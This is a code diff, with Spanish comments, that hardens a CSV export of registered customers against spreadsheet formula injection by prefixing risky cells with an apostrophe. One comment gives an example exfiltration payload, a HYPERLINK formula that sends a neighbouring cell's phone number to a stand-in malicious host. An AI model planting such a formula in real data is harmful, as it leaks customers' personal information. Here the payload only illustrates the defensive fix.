@@ -40,7 +40,24 @@ export async function GET() {
      order by p.created_at desc
   `;
 
-  const escapar = (v: string) => `"${String(v).replace(/"/g, '""')}"`;
+  // Excel, LibreOffice y Google Sheets evalúan como FÓRMULA cualquier celda que
+  // empiece por = + - @ o por tabulador/retorno. Las comillas del CSV no lo
+  // impiden: son del formato, no del contenido — el programa las quita al
+  // parsear y evalúa lo que queda.
+  //
+  // El nombre lo escribe el público en el formulario de registro, y este archivo
+  // lo abre el personal en Excel. Sin esto, alguien se registra como
+  // `=HYPERLINK("http://sitio-malo/?d="&B2,"Cobrar aquí")` y la lista de
+  // clientes le entrega el celular de la fila de al lado al primer clic.
+  //
+  // El apóstrofo delante es la neutralización estándar: la hoja de cálculo lo
+  // trata como "esto es texto". Ningún nombre real empieza por esos caracteres,
+  // así que ninguna fila legítima se ve alterada.
+  const FORMULA = /^[=+\-@\t\r]/;
+  const escapar = (v: string) => {
+    const s = String(v);
+    return `"${(FORMULA.test(s) ? `'${s}` : s).replace(/"/g, '""')}"`;
+  };
 
   const lineas = [
     ['Nombre', 'Celular', 'Pueblo', 'Registrado', 'Tiradas', 'Premios'].join(','),
